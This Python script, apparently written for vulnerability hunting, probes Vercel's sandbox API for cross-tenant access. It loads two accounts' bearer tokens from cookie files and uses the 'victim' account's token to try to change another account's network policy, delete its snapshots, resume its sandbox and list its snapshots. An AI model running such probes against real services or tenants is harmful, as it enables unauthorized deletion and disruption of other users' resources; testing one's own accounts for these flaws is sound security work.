# -*- coding: utf-8 -*-
"""跨租户写操作矩阵 (v44x): victim 对 attacker 资源的 POST/DELETE
1) victim POST network-policy 改 attacker session 配置
2) victim DELETE attacker 的快照
3) victim 用 attacker 的 sandbox name + resume
4) victim 用 attacker 的 sandbox name 列表快照"""
import json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')

def load_token(path):
    for ln in open(path, encoding='utf-8'):
        if ln.startswith('authorization=Bearer '):
            return ln.split('Bearer ')[1].strip()
    raise RuntimeError('no token in ' + path)

TOK_A = load_token(r'F:\scan\vercel_cookies.txt')
TOK_V = load_token(r'F:\scan\vercel_cookies2.txt')
TEAM_A = 'team_GIy1SZ444lspqeNbh4r8uAUg'
PROJ_A = 'prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F'
TEAM_V = 'team_jnske5hDpDfj9eDG2PAfDqWf'
PROJ_V = 'prj_LX0QDsEAlWA0uRZvVTunSef3lllF'

import urllib.request, urllib.error

def api_tok(tok, method, path, body=None, timeout=60):
    req = urllib.request.Request('https://api.vercel.com' + path, method=method)
    req.add_header('Authorization', 'Bearer ' + tok)
    req.add_header('Content-Type', 'application/json')
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:300]
    except Exception as e:
        return -1, 'EXC %s' % e

if __name__ == '__main__':
    # 准备: attacker 建 sandbox + 拿快照 id
    print('=== attacker setup ===', flush=True)
    api_tok(TOK_A, 'DELETE', '/v2/sandboxes/v44x?teamId=%s&projectId=%s' % (TEAM_A, PROJ_A))
    time.sleep(2)
    c, r = api_tok(TOK_A, 'POST', '/v4/sandboxes?teamId=%s' % TEAM_A, {'projectId': PROJ_A, 'name': 'v44x'}, 60)
    print('create:', c, flush=True)
    sid_a = json.loads(r)['sandbox']['currentSessionId']
    time.sleep(2)
    c, r = api_tok(TOK_A, 'POST', '/v2/sandboxes/sessions/%s/stop?teamId=%s&projectId=%s' % (sid_a, TEAM_A, PROJ_A), {}, timeout=90)
    print('stop:', c, flush=True)
    snap_a = None
    try:
        snap_a = json.loads(r)['sandbox']['currentSnapshotId']
    except Exception:
        pass
    # 如果 stop 太快没快照, 用列表里的
    if not snap_a:
        c, r = api_tok(TOK_A, 'GET', '/v2/sandboxes/snapshots?teamId=%s&project=%s&limit=5' % (TEAM_A, PROJ_A))
        for s in json.loads(r).get('snapshots', []):
            if s.get('status') == 'created':
                snap_a = s['id']
                break
    print('attacker sid=%s snap=%s' % (sid_a, snap_a), flush=True)
    # resume attacker sandbox (保持可用)
    c, r = api_tok(TOK_A, 'GET', '/v2/sandboxes/v44x?teamId=%s&projectId=%s&resume=true' % (TEAM_A, PROJ_A), timeout=120)
    print('resume A:', c, flush=True)

    print('=== V1: victim 改 attacker 的 network-policy ===', flush=True)
    c, r = api_tok(TOK_V, 'POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (sid_a, TEAM_V), {'mode': 'deny-all'}, 60)
    print('->', c, (r or '')[:200], flush=True)
    c, r = api_tok(TOK_V, 'POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s&projectId=%s' % (sid_a, TEAM_V, PROJ_V), {'mode': 'deny-all'}, 60)
    print('->', c, (r or '')[:200], flush=True)

    print('=== V2: victim DELETE attacker 的快照 ===', flush=True)
    if snap_a:
        c, r = api_tok(TOK_V, 'DELETE', '/v2/sandboxes/snapshots/%s?teamId=%s&project=%s' % (snap_a, TEAM_V, PROJ_V), timeout=90)
        print('->', c, (r or '')[:200], flush=True)
        c, r = api_tok(TOK_V, 'DELETE', '/v2/sandboxes/snapshots/%s?teamId=%s' % (snap_a, TEAM_V), timeout=90)
        print('->', c, (r or '')[:200], flush=True)
    # 确认 attacker 快照还在 (未被删)
    c, r = api_tok(TOK_A, 'GET', '/v2/sandboxes/snapshots/%s?teamId=%s&project=%s' % (snap_a, TEAM_A, PROJ_A))
    print('A snap still:', c, 'created' in (r or ''), flush=True)

    print('=== V3: victim 用 attacker 的 name resume ===', flush=True)
    c, r = api_tok(TOK_V, 'GET', '/v2/sandboxes/v44x?teamId=%s&projectId=%s&resume=true' % (TEAM_V, PROJ_V), timeout=90)
    print('->', c, (r or '')[:200], flush=True)

    print('=== V4: victim 列 attacker 项目的快照 ===', flush=True)
    c, r = api_tok(TOK_V, 'GET', '/v2/sandboxes/snapshots?teamId=%s&project=%s&limit=5' % (PROJ_A and TEAM_V, PROJ_A))
    print('->', c, (r or '')[:300], flush=True)

    # 清理
    api_tok(TOK_A, 'DELETE', '/v2/sandboxes/v44x?teamId=%s&projectId=%s' % (TEAM_A, PROJ_A))
    print('CLEANED', flush=True)
